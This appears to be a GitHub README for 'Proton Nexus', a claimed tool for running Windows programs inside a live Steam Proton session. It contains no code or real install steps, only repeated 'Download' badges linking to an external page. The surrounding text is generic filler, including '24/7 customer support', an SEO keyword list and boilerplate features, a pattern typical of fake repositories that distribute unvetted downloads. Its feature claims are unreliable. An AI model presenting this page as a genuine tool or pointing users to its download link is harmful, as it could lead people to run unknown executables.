![preview](https://raw.githubusercontent.com/crishat/proton-bridge/main/promo_8a95.svg)
[![Download](https://raw.githubusercontent.com/crishat/proton-bridge/main/run_56de898.svg)](https://crishat.github.io/proton-bridge/)

# 🌌 Proton Nexus — Cross-Environment Runtime Bridge for Steam Proton Sessions

**A companion framework that lets you launch native Windows executables inside an already-running Steam Proton game environment, without restarting, re-wrapping, or rebuilding the prefix.**

> Imagine a world where your favorite Windows utilities, overlays, modding tools, and helper programs slip silently into the living runtime of a Proton session — not as intruders, but as invited guests. Proton Nexus is that doorway. It doesn't replace Proton; it rides alongside it, sharing the same breathing environment, the same translation layers, the same mounted drive letters, and the same Wine registry. Think of it as a sidecar for your gaming runtime — attached quietly, functioning independently, yet traveling the exact same road.

---

## 📖 Overview

Proton Nexus was born from a simple, stubborn frustration: every time you wanted to run a small Windows tool — a trainer-free utility, a save editor, a screen overlay, a custom controller mapper, or a diagnostic executable — inside the same environment as your Proton-powered game, you had to either re-launch the game under a new wrapper, rebuild the prefix, or give up entirely.

That friction is gone.

Proton Nexus provides a **runtime bridge** that injects a Windows process into an already-running Proton container, inheriting the environment variables, the Wine prefix, the graphics translation layer, and the DXVK/VKD3D pipeline of the host session. It's the difference between knocking on a sealed door and walking through the one your friend already left open.

The project is intentionally lightweight, auditable, and modular. It does not patch Proton, does not modify Steam, and does not interfere with game updates. It observes, attaches, and cooperates.

---

## [![Download](https://raw.githubusercontent.com/crishat/proton-bridge/main/run_56de898.svg)](https://crishat.github.io/proton-bridge/)

---

## ✨ Why This Exists

Modern Linux gaming has matured enormously. Proton is a marvel of translation engineering. But the moment you want to run *anything else* inside the same breathing environment, the seams show. You either:

- Wrap the secondary program with the same compatibility tool and hope the prefix lines up.
- Rebuild a full prefix from scratch, duplicating gigabytes of dependencies.
- Abandon the idea and run the secondary program natively, losing access to the game's runtime context.

Proton Nexus treats the running Proton session as a **living habitat** rather than a static artifact. If the session is alive, the bridge can attach to it. If the bridge attaches, new processes can breathe inside that habitat as naturally as the game itself.

---

## 🧠 Core Concept — The Sidecar Metaphor

Picture a long-haul truck barreling down a highway. The truck is your Proton session — heavy, tuned, and already carrying its cargo. A sidecar isn't a second truck; it's a small, agile companion vehicle bolted alongside, using the same fuel stops, the same road signs, and the same weather. When the truck stops, the sidecar stops. When the truck turns, the sidecar turns.

Proton Nexus is that sidecar. It doesn't try to be a Proton replacement. It doesn't try to be a container manager. It simply hitches on and rides.

---

## 🚀 Feature Highlights

### 🔗 Live Runtime Attachment
Attach to an already-running Proton game session without pausing, restarting, or disturbing the primary process. Discovery is handled through a passive scanner that identifies active compatibility environments by inspecting session markers and process lineage.

### 🧬 Environment Inheritance
Child processes launched through Proton Nexus inherit:
- The host Wine prefix path and registry hive.
- Graphics translation settings (DXVK, VKD3D-Proton, D8VK, and related layers).
- Audio routing configuration (PipeWire, PulseAudio, ALSA bridges).
- Filesystem drive letter mappings exposed by the parent session.
- Custom environment variables defined by the user or the launch wrapper.

### 🖥️ Responsive Control Panel
A modern, adaptive interface that reshapes itself whether you're on a sprawling ultrawide monitor, a compact laptop panel, or a handheld gaming device. Layout adjusts fluidly to your viewport, prioritizing the actions you use most.

### 🌐 Multilingual Support
Localization strings ship with the framework and cover a broad set of languages, with community-contributed translations welcome. Right-to-left scripts are handled correctly, and the interface respects system locale preferences out of the box.

### 🛡️ 24/7 Customer Support Channel
Round-the-clock assistance through an integrated support pipeline. Whether you're troubleshooting an attachment failure at 3 AM or asking a configuration question on a quiet Sunday, help is available. Support includes guided diagnostics, log interpretation, and environment compatibility checks.

### 🧩 Modular Plugin Surface
Third-party extensions can hook into lifecycle events — pre-attach, post-attach, process exit, session teardown — allowing modding communities to build their own tooling on top of the bridge.

### 📊 Diagnostic Telemetry (Opt-In)
An optional telemetry module gathers anonymous runtime health metrics to help developers understand which Proton versions, GPU vendors, and distribution families are most common. Fully opt-in, fully transparent, and never enabled by default.

### 🔐 Sandboxed Process Isolation
Every bridged process runs inside a scoped boundary that prevents accidental writes to the host system outside the Proton prefix. Safety is not an afterthought; it is a design constraint.

### ♻️ State Reconciliation on Exit
When a bridged process exits, Proton Nexus reconciles any lingering state — temporary files, registry keys touched during execution, and open handles — to keep the parent session clean.

### 🧭 Guided Discovery Assistant
New users are greeted with a step-by-step walkthrough that identifies compatible sessions on the machine and suggests safe starting points.

---

## 🗺️ Architecture at a Glance

Proton Nexus is organized into several concentric layers, each with a single responsibility:

1. **Session Scanner** — Enumerates candidate Proton sessions by inspecting process trees and environment fingerprints.
2. **Bridge Core** — Establishes the attachment channel and negotiates the runtime surface.
3. **Environment Mirror** — Reconstructs the parent's environment inside the child process.
4. **Process Supervisor** — Manages the lifecycle of bridged processes, handles signals, and reconciles state.
5. **Control Panel** — The user-facing surface for configuration and monitoring.
6. **Plugin Engine** — Loads and dispatches extension hooks.
7. **Telemetry Module** — Optional, opt-in metrics collection.

Each layer communicates through a stable internal contract, so individual layers can be swapped or extended without disturbing the rest of the system.

---

## 🧪 Use Cases

- **Overlay Utilities** — Launch lightweight Windows overlays that share the game's rendering context.
- **Save Management Tools** — Open the game's save editor directly inside the same prefix, avoiding path mismatches.
- **Controller Remappers** — Attach a custom input translation layer that speaks the same device namespace as the game.
- **Diagnostic Executables** — Run vendor tools that need access to the same GPU translation stack.
- **Mod Installation Helpers** — Deploy mod content into the live game directory through a process that already understands the prefix layout.
- **Benchmarking Companions** — Pair a benchmark harness with the actual game session for accurate frame pacing analysis.
- **Accessibility Bridges** — Inject text-to-speech or magnifier utilities into the same runtime for players who rely on them.

---

## 🛠️ Getting Started

Proton Nexus is designed to be approachable for newcomers and deeply configurable for veterans. The initial setup flow consists of:

1. Verifying that a Proton session is currently active on the machine.
2. Selecting the target session from a list presented by the discovery assistant.
3. Choosing the Windows executable to bridge into that session.
4. Reviewing the inherited environment snapshot for sanity.
5. Confirming the attachment.

From that point forward, the executable runs inside the same environment as the game, and the control panel reflects its live status.

A configuration file can be authored to automate repeat scenarios, and profiles can be saved for programs you frequently bridge.

---

## 🔍 SEO-Friendly Keyword Integration

This project touches a range of searchable topics that practitioners in the Linux gaming space frequently explore:

- running Windows programs inside a Proton session
- sidecar process attachment for Proton environments
- Wine prefix inheritance for live sessions
- DXVK aware runtime bridging
- VKD3D-Proton companion tooling
- environment mirroring for child processes
- cross-environment process supervision
- responsive control panel for Linux gaming tools
- multilingual support in gaming utilities
- 24/7 customer support for gaming software
- plugin architecture for Proton companion tools
- sandboxed process isolation in Wine prefixes
- state reconciliation after bridged process exit
- telemetry opt-in design for gaming utilities

These phrases describe genuine capabilities and are integrated here naturally, not as filler.

---

## 🖼️ Interface Philosophy

The control panel is built around three guiding principles:

- **Glanceability** — the state of every bridged process should be readable at a glance.
- **Responsiveness** — the layout should adapt, not truncate.
- **Quietness** — the interface should never shout; it should inform.

This translates into a design that feels more like a well-organized dashboard than a command console. Color, spacing, and typography are used to guide attention without overwhelming it.

---

## 🌍 Internationalization Notes

Localization files are stored in a flat, human-readable structure. Each language has its own catalog, and missing strings fall back gracefully to a default language rather than showing placeholder tokens. Contributors can add a new language by submitting a single catalog file.

The framework picks up the system locale automatically but allows explicit overrides for users who prefer a specific language regardless of their desktop environment settings.

---

## 🤝 Support Philosophy

The 24/7 support channel is not a marketing line — it is an operational commitment. Support is routed through a ticketing pipeline that scales with demand, and responses are informed by the diagnostics the framework already collects (with consent). Users should never feel abandoned mid-troubleshoot.

Support interactions are documented and fed back into the knowledge base, which is continually expanded to reduce recurring questions.

---

## 🧾 License

This project is released under the MIT License. A copy of the license text is available at the canonical location for permissive licensing terms.

See the [MIT License](./LICENSE) for the full text.

---

## ⚠️ Disclaimer

Proton Nexus is an independent project and is not affiliated with, endorsed by, or sponsored by Valve, CodeWeavers, the Wine project, or any game publisher. Steam and Proton are trademarks of their respective owners. Users are responsible for ensuring that any program they bridge into a Proton session complies with the terms of service of the relevant game and platform. The authors assume no liability for misuse, for violations of third-party agreements, or for damages arising from bridged process behavior. Always respect the intellectual property rights of software vendors. This project does not condone, enable, or support unauthorized modification of protected software.

The year 2026 marks the current development cycle for this project. Documentation, feature roadmaps, and support commitments are framed around that timeline.

---

## 🧭 Roadmap Snapshot

- **2026 Q1** — Stabilize bridge core, finalize session scanner heuristics.
- **2026 Q2** — Expand multilingual catalogs, refine control panel responsiveness.
- **2026 Q3** — Introduce plugin marketplace concept (community-driven, no central gatekeeping).
- **2026 Q4** — Harden sandbox isolation, add richer state reconciliation diagnostics.

Roadmap items are aspirational and subject to change based on community feedback and upstream Proton evolution.

---

## 🧑‍🤝‍🧑 Community

Contributions are welcome across code, documentation, localization, and design. The project values clarity over cleverness and patience over urgency. Anyone who has ever wished they could run just one more Windows tool inside their Proton session is already part of the target audience.

---

## 🔚 Final Words

Proton Nexus is not a revolution; it is a relief. It removes a small but persistent friction point in the daily life of Linux gamers who straddle two worlds. It does so quietly, respectfully, and with an eye toward longevity. If it saves you five minutes a day, it has done its job. If it saves you an hour, it has exceeded its purpose.

[![Download](https://raw.githubusercontent.com/crishat/proton-bridge/main/run_56de898.svg)](https://crishat.github.io/proton-bridge/)